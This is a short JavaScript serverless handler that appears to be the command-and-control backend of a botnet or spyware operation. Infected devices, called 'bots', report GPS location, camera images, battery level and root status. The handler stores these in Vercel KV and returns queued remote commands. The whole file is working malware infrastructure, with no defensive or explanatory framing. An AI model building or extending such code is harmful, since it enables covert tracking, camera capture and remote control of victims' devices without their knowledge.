// Store bots in Vercel KV (free tier) – 25 GB, 30 d TTL
import {kv} from '@vercel/kv';
export default async (req,res)=>{
  const j=await req.json();
  const {id,lat,lon,img,battery,root}=j;
  if(img) await kv.set(`cam:${id}`,img,{ex:3600});
  if(lat) await kv.hset(`bot:${id}`,{lat,lon,battery,root,ts:Date.now()});
  const cmd=await kv.get(`cmd:${id}`);
  if(cmd) await kv.del(`cmd:${id}`);
  res.json({cmd});
};
